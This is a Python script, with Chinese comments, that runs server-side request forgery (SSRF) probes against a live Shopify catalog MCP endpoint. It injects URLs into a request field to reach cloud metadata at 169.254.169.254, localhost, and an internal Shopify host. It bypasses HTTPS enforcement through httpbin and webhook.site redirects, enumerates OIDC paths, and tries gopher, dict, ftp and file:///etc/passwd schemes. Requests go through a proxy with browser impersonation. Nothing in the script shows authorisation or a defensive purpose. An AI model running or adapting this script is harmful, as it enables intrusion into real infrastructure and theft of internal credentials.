# -*- coding: utf-8 -*-
"""SSRF 深化 v3:
1. OIDC 端点精确确认(version_unsupported = JSON 被解析)
2. 重定向绕过:外网 https -> 302 -> http://内网(metadata/127.0.0.1) 绕过 https 强制
3. OIDC 路径枚举
"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"
base = "https://shop-server.sfe.shopifyinternal.com"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] {dt:.1f}s | {r.text[:280]}", flush=True)
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__}", flush=True)

if __name__ == "__main__":
    print("== A. OIDC 精确确认 ==")
    for p in ["/.well-known/openid-configuration", "/.well-known/openid-configuration/", "/.well-known/jwks.json"]:
        probe(f"oidc{p}", base + p)
        time.sleep(0.4)

    print("\n== B. 重定向绕过(httpbin) ==")
    redirects = [
        ("httpbin-302-metadata", "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"),
        ("httpbin-302-127", "https://httpbin.org/redirect-to?url=http://127.0.0.1/"),
        ("httpbin-307-metadata", "https://httpbin.org/redirect-to?status_code=307&url=http://169.254.169.254/latest/meta-data/"),
        ("httpbin-301-metadata", "https://httpbin.org/redirect-to?status_code=301&url=http://169.254.169.254/latest/meta-data/"),
        ("httpbin-302-shopserver-http", "https://httpbin.org/redirect-to?url=http://shop-server.sfe.shopifyinternal.com/healthz"),
        ("httpbin-302-https-metadata", "https://httpbin.org/redirect-to?url=https://169.254.169.254/latest/meta-data/"),
        ("httpbin-absolute-https", "https://httpbin.org/absolute-redirect/3"),
    ]
    for label, p in redirects:
        probe(label, p)
        time.sleep(0.5)

    print("\n== C. 重定向绕过(webhook.site 302) ==")
    # webhook.site 配置重定向到内网
    cfg = {"default_status": 302, "redirect": True, "redirect_url": "http://169.254.169.254/latest/meta-data/"}
    try:
        r = requests.put("https://webhook.site/token/3527a249-5beb-4849-ab04-5954d8194531", json=cfg, headers=H, proxies=PROXY, impersonate="chrome", timeout=20)
        print(f"[wh config] HTTP {r.status_code} | {r.text[:100]}")
    except Exception as e:
        print(f"[wh config] ERROR {e}")
    time.sleep(1)
    probe("wh302-metadata", "https://webhook.site/3527a249-5beb-4849-ab04-5954d8194531")
    time.sleep(0.5)
    # 恢复普通 200
    cfg2 = {"default_status": 200, "redirect": False,
            "default_content": '{"ucp":{"version":"2026-04-08"}}',
            "default_content_type": "application/json"}
    try:
        requests.put("https://webhook.site/token/3527a249-5beb-4849-ab04-5954d8194531", json=cfg2, headers=H, proxies=PROXY, impersonate="chrome", timeout=20)
    except Exception as e:
        print(f"[wh restore] ERROR {e}")

    print("\n== D. OIDC 路径枚举 ==")
    oidc_paths = [
        "/oauth2", "/oauth2/", "/oauth2/authorize", "/oauth2/token", "/oauth2/userinfo",
        "/oauth2/jwks", "/oauth2/keys", "/oauth2/v1/keys",
        "/connect", "/connect/register", "/connect/devicecode",
        "/oidc", "/oidc/jwks", "/oidc/keys",
        "/authorize", "/token", "/userinfo", "/register",
        "/certs", "/keys", "/jwks", "/v1/keys",
        "/.well-known/oauth-authorization-server",
        "/.well-known/webfinger",
        "/.well-known/openid-federation",
        "/healthz/openid", "/api/oidc",
    ]
    for p in oidc_paths:
        probe(f"o{p}", base + p)
        time.sleep(0.25)

    print("\n== E. 协议尝试 ==")
    for label, p in [
        ("gopher", "gopher://169.254.169.254:80/_GET%20/HTTP/1.1%0A"),
        ("dict", "dict://127.0.0.1:6379/info"),
        ("ftp", "ftp://shop-server.sfe.shopifyinternal.com/"),
        ("file", "file:///etc/passwd"),
        ("http-meta", "http://169.254.169.254/latest/meta-data/"),
    ]:
        probe(label, p)
        time.sleep(0.4)
